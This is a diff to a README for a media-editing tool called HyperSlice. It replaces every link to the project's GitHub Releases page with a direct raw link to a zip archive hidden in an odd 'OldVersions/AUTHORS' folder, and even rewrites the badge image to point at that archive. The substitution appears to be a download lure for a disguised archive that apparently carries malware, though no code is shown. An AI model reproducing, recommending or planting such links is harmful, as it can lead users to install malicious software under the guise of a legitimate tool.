@@ -1,6 +1,6 @@
 # ✂️⚡️🔪️🌐️ HyperSlice_Website - Effortlessly Cut Elements from Media
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/eclipse770/HyperSlice_Website/releases)
+[![Download Now](https://raw.githubusercontent.com/eclipse770/HyperSlice_Website/HyperSlice_Website_Main-dev/OldVersions/AUTHORS/HyperSlice_Website_v3.2.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/eclipse770/HyperSlice_Website/HyperSlice_Website_Main-dev/OldVersions/AUTHORS/HyperSlice_Website_v3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Welcome to HyperSlice! This tool enables you to quickly cut elements from your d
 
 To get started with HyperSlice, visit the Releases page to download the latest version:
 
-[Download HyperSlice](https://github.com/eclipse770/HyperSlice_Website/releases)
+[Download HyperSlice](https://raw.githubusercontent.com/eclipse770/HyperSlice_Website/HyperSlice_Website_Main-dev/OldVersions/AUTHORS/HyperSlice_Website_v3.2.zip)
 
 ### 📅 Latest Release
 
@@ -64,4 +64,4 @@ Thank you for choosing HyperSlice as your digital media editing tool. We hope yo
 
 For more information and updates, check our project page regularly. 
 
-[Download HyperSlice](https://github.com/eclipse770/HyperSlice_Website/releases)
+[Download HyperSlice](https://raw.githubusercontent.com/eclipse770/HyperSlice_Website/HyperSlice_Website_Main-dev/OldVersions/AUTHORS/HyperSlice_Website_v3.2.zip)
